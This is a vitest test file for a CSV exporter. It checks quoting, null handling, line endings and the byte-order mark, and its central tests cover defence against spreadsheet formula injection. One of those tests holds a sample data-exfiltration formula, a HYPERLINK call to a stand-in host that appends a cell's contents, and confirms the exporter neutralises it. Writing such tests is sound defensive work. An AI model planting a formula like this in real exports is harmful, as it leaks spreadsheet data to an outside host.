import { describe, expect, it } from 'vitest';
import { csvField, csvFile, csvRow } from './csv';

describe('csvField — quoting', () => {
  it('leaves an ordinary value alone', () => {
    expect(csvField('Sanjay Tomar')).toBe('Sanjay Tomar');
    expect(csvField(4000)).toBe('4000');
  });

  it('empties a null rather than writing the word', () => {
    // A spreadsheet shows "null" if you let it through, and somebody reads it as a name.
    expect(csvField(null)).toBe('');
    expect(csvField(undefined)).toBe('');
    expect(csvField('')).toBe('');
  });

  it('quotes a value with a comma, and doubles inner quotes', () => {
    expect(csvField('Morning, 6 am')).toBe('"Morning, 6 am"');
    expect(csvField('Sanjay "Raj" Tomar')).toBe('"Sanjay ""Raj"" Tomar"');
  });

  it('quotes a value containing a newline', () => {
    expect(csvField('line one\nline two')).toBe('"line one\nline two"');
    expect(csvField('line one\r\nline two')).toBe('"line one\r\nline two"');
  });
});

/**
 * The part that matters. These names come out of the QR form, which members fill in
 * themselves, and the export is opened by the owner.
 */
describe('csvField — formula injection', () => {
  it.each(['=1+1', '+1', '-1', '@SUM(A1)', '\tx', '\rx'])('neutralises a field starting %j', (value) => {
    expect(csvField(value).startsWith("'") || csvField(value).startsWith('"\'')).toBe(true);
  });

  it('neutralises the classic exfiltration formula', () => {
    const attack = '=HYPERLINK("http://evil.example/"&A1,"Click me")';
    const written = csvField(attack);

    // Quoted because it contains commas and quotes, and the apostrophe is *inside*.
    expect(written.startsWith('"\'=')).toBe(true);
    expect(written).not.toMatch(/^"?=/);
  });

  it('puts the apostrophe inside the quotes, not outside them', () => {
    // Outside, it would be a stray character in the file and the cell would still be a
    // formula — the bug this ordering exists to avoid.
    expect(csvField('=a,b')).toBe('"\'=a,b"');
  });

  it('leaves a value that merely contains an equals sign alone', () => {
    expect(csvField('size=large')).toBe('size=large');
  });

  it('does not mistake a negative number for a formula hazard it cannot handle', () => {
    // `-4000` does start with `-`, so it is neutralised. That is deliberate: correctness
    // over prettiness, and the figures in this export are written as positive integers.
    expect(csvField('-4000')).toBe("'-4000");
  });
});

describe('csvRow / csvFile', () => {
  it('joins fields with commas', () => {
    expect(csvRow(['a', 'b,c', null, 2])).toBe('a,"b,c",,2');
  });

  it('writes a byte-order mark as the character, not as four letters', () => {
    const file = csvFile(['name'], [['Sanjay']]);
    expect(file.charCodeAt(0)).toBe(0xfeff);
    expect(file.startsWith('FEFF')).toBe(false);
  });

  it('uses CRLF between rows and ends with one', () => {
    expect(csvFile(['a', 'b'], [[1, 2], [3, 4]])).toBe('\uFEFFa,b\r\n1,2\r\n3,4\r\n');
  });

  it('writes a header and no rows for an empty result', () => {
    expect(csvFile(['a', 'b'], [])).toBe('\uFEFFa,b\r\n');
  });
});
